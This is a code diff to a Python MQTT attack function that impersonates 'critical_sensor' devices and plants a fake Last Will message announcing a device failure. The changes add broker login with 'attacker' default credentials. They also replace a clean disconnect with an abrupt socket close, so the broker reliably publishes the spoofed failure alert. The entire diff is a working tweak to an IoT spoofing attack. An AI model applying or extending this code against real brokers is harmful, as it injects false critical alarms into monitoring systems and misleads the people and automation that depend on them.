@@ -6,6 +6,7 @@ import time
 
 def lwt_abuse_attack(broker, port, client_num):
     client = mqtt.Client(client_id=f"critical_sensor_{client_num}")
+    client.username_pw_set(os.getenv("MQTT_USER", "attacker"), os.getenv("MQTT_PASS", "attackerpass"))
     
     # Configure a fake Last Will to look like a critical device.
     lwt_message = f'{{"device":"sensor_{client_num}","status":"DEVICE_FAILURE","battery":0}}'
@@ -14,7 +15,7 @@ def lwt_abuse_attack(broker, port, client_num):
     # Connect and disconnect abruptly to trigger the LWT.
     client.connect(broker, port, 60)
     time.sleep(0.5)
-    client.disconnect()  # Dispara Last Will Testament
+    client.socket().close()  # Close without DISCONNECT: the broker publishes the Will only when the connection drops
     
     print(f"[!] LWT triggered for fake device: critical_sensor_{client_num}")
 
